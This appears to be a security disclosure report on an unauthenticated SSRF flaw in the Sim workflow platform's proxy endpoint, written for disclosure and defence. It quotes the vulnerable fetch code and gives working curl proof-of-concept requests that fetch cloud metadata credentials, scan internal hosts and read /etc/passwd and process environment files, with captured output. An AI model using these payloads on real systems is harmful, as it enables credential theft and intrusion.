SSRF Vulnerability Analysis Report

commit: fdfa935

This report provides a comprehensive security analysis of a critical Server-Side Request Forgery (SSRF) vulnerability discovered in the Sim workflow automation platform. The vulnerability, located in /app/api/proxy/route.ts, allows unauthenticated attackers to make arbitrary HTTP requests to internal network resources and cloud services, potentially leading to complete system compromise.


```bash
git clone https://github.com/simstudioai/sim.git
cd sim/
sudo docker compose -f docker-compose.prod.yml up -d
```

## Vulnerable Code

```javascript
  // File: /app/api/proxy/route.ts, Lines 113-120
  const response = await fetch(targetUrl, {
    method: method,
    headers: {
      ...getProxyHeaders(),
      ...customHeaders,
    },
    body: body || undefined,
  })
```
  
## Root Cause Analysis

  The fundamental security flaw is the direct and unvalidated use of user-controlled input in a server-side HTTP
  request. The application accepts a url parameter from unauthenticated users and passes it directly to the
  fetch() function without any security validation or sanitization.

  1. No URL Validation: The target URL is taken directly from user input without validation
  2. No Protocol Restrictions: Any protocol (http, https, file, etc.) is accepted
  3. No IP/Hostname Filtering: Internal IP addresses and hostnames are accessible
  4. No Port Restrictions: Any port can be targeted
  5. No Authentication Required: The endpoint is publicly accessible

##  Attack Surface Analysis

User Input → GET /api/proxy?url={target} → Direct fetch(targetUrl) → Full Response Return

  Proof of Concept (POC)

  POC 1: Internal Service Discovery

  # AWS EC2 Metadata Attack
  curl
  "https://target-domain.com/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

  # Local Service Detection
  curl "https://target-domain.com/api/proxy?url=http://localhost:3000"

  # Internal Network Scanning
  curl "https://target-domain.com/api/proxy?url=http://192.168.1.1:22"

  # Potential file access through local file inclusion
  curl "https://target-domain.com/api/proxy?url=file:///etc/passwd"
  curl "https://target-domain.com/api/proxy?url=file:///etc/environment"
  curl "https://target-domain.com/api/proxy?url=file:///proc/self/environ"

  Impact Assessment

  Direct Impact

  1. Internal Network Access: Attackers can access any internal service
  2. Cloud Service Compromise: AWS, GCP, Azure metadata can be accessed
  3. Data Exfiltration: Sensitive data from internal databases and services
  4. Service Takeover: Unauthenticated internal services can be compromised
  5. Lateral Movement: Use compromised services as pivot points

  Business Impact

  1. Complete System Compromise: Through cloud metadata credential theft
  2. Data Breach: Access to internal databases and file systems
  3. Service Disruption: Denial of service through resource exhaustion
  4. Compliance Violations: GDPR, HIPAA, SOC 2 violations
  5. Financial Loss: Through resource abuse and data theft



```bash
curl "http://IP:3000/api/proxy?url=file:///etc/passwd"

{"success":true,"status":200,"statusText":"","headers":{},"data":"root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nsync:x:5:0:sync:/sbin:/bin/sync\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\nhalt:x:7:0:halt:/sbin:/sbin/halt\nmail:x:8:12:mail:/var/mail:/sbin/nologin\nnews:x:9:13:news:/usr/lib/news:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin\ncron:x:16:16:cron:/var/spool/cron:/sbin/nologin\nftp:x:21:21::/var/lib/ftp:/sbin/nologin\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\ngames:x:35:35:games:/usr/games:/sbin/nologin\nntp:x:123:123:NTP:/var/empty:/sbin/nologin\nguest:x:405:100:guest:/dev/null:/sbin/nologin\nnobody:x:65534:65534:nobody:/:/sbin/nologin\nbun:x:1000:1000:Linux User,,,:/home/bun:/bin/sh\n"}
```